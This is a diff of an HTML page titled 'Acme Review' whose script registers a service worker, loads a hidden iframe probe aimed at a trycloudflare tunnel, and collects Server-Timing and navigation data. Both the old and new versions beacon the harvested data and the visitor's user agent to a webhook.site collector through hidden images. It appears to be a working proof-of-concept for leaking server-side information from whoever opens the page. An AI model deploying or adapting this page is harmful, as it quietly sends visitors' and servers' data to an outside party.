@@ -1,127 +1,65 @@
-
-<!DOCTYPE html>
+<!doctype html>
 <html lang="ko">
-<head>
-  <meta charset="UTF-8">
-  <title>Acme Review</title>
-</head>
+<head><meta charset="utf-8"><title>Acme Review</title></head>
 <body>
-  <h2>Acme Review</h2>
-  <pre id="result">Starting...</pre>
+<h2>Acme Review</h2>
+<pre id="output">Starting...</pre>
+<script>
+const PORTAL = 'https://originally-yours-respondents-combined.trycloudflare.com';
+const HOOK = 'https://webhook.site/ecf90bba-d52e-4352-b2d5-3b81ce45a357';
+const output = document.querySelector('#output');
+const beacons = [];
+let started = false;
+function log(stage, data = {}) {
+  const record = {stage, data, ua: navigator.userAgent};
+  output.textContent += '\n' + JSON.stringify(record);
+  console.log(record);
+  const image = new Image();
+  beacons.push(image);
+  image.src = HOOK + '?event=' + encodeURIComponent(stage) +
+    '&data=' + encodeURIComponent(JSON.stringify(record).slice(0, 1500)) +
+    '&t=' + Date.now() + Math.random().toString(36).slice(2);
+}
+function start() {
+  if (started) return;
+  started = true;
+  log('sw-ready');
+  const frame = document.createElement('iframe');
+  frame.hidden = true;
+  frame.onload = () => {
+    log('frame-loaded');
+    try {
+      const nav = frame.contentWindow.performance.getEntriesByType('navigation')[0];
+      const serverTiming = Array.from(nav?.serverTiming || [], t => ({
+        name:t.name, description:t.description, duration:t.duration
+      }));
+      log('navigation-timing', {serverTiming, workerStart:nav?.workerStart});
+    } catch (e) { log('navigation-error', {message:e.message}); }
+  };
+  frame.onerror = () => log('frame-error');
+  frame.src = './probe?portal=' + encodeURIComponent(PORTAL) + '&t=' + Date.now();
+  document.body.appendChild(frame);
+  log('probe-started');
+}
+async function main() {
+  log('page-opened');
+  try {
+    navigator.serviceWorker.addEventListener('controllerchange', () => {
+      if (navigator.serviceWorker.controller) start();
+    });
+    await navigator.serviceWorker.register('./sw.js?v=8', {updateViaCache:'none'});
+    await navigator.serviceWorker.ready;
+    if (navigator.serviceWorker.controller) start();
+    else if (!new URL(location.href).searchParams.has('retry')) {
+      log('first-load-retry');
+      const next = new URL(location.href);
+      next.searchParams.set('retry', '1');
+      setTimeout(() => location.replace(next), 1000);
+    } else log('no-controller');
+  } catch (e) {log('main-error', {message:e.message});}
+}
+main();
+</script>
+</body></html>
 
-  <script>
-    const PORTAL =
-      "https://originally-yours-respondents-combined.trycloudflare.com";
-
-    const HOOK =
-      "https://webhook.site/ecf90bba-d52e-4352-b2d5-3b81ce45a357";
-
-    const output = document.getElementById("result");
-
-    function log(stage, data = {}) {
-      const report = {
-        stage,
-        data,
-        userAgent: navigator.userAgent
-      };
-
-      output.textContent +=
-        "\n" + JSON.stringify(report, null, 2);
-
-      console.log(report);
-
-      // 실행 결과를 Webhook.site에서 확인
-      const img = new Image();
-      img.style.display = "none";
-      img.src =
-        HOOK +
-        "?event=" + encodeURIComponent(stage) +
-        "&data=" + encodeURIComponent(
-          JSON.stringify(report).slice(0, 1500)
-        ) +
-        "&t=" + Date.now();
-
-      document.body.appendChild(img);
-    }
-
-    async function main() {
-      log("page-opened");
-
-      try {
-        await navigator.serviceWorker.register(
-          "./sw.js?v=5",
-          { updateViaCache: "none" }
-        );
-
-        await navigator.serviceWorker.ready;
-
-        if (!navigator.serviceWorker.controller) {
-          location.reload();
-          return;
-        }
-
-        log("sw-ready");
-
-        const frame = document.createElement("iframe");
-        frame.style.display = "none";
-
-        frame.onload = () => {
-          log("frame-loaded");
-
-          // 부모 문서의 리소스 성능 정보
-          const resources =
-            performance.getEntriesByType("resource")
-              .filter(e => e.name.includes("/probe"));
-
-          log("parent-timing", resources.map(e => ({
-            name: e.name,
-            serverTiming: e.serverTiming
-          })));
-
-          // iframe 문서의 Navigation Timing 정보
-          try {
-            const nav =
-              frame.contentWindow.performance
-                .getEntriesByType("navigation")[0];
-
-            log("navigation-timing", {
-              name: nav?.name,
-              serverTiming: (nav?.serverTiming || [])
-                .map(t => ({
-                  name: t.name,
-                  description: t.description,
-                  duration: t.duration
-                }))
-            });
-          } catch (error) {
-            log("navigation-error", {
-              message: error.message
-            });
-          }
-        };
-
-        frame.onerror = () => {
-          log("frame-error");
-        };
-
-        frame.src =
-          "./probe?portal=" +
-          encodeURIComponent(PORTAL) +
-          "&t=" + Date.now();
-
-        document.body.appendChild(frame);
-
-        log("probe-started");
-
-      } catch (error) {
-        log("main-error", {
-          message: error.message
-        });
-      }
-    }
-
-    main();
-  </script>
-</body>
-</html>
-
+       
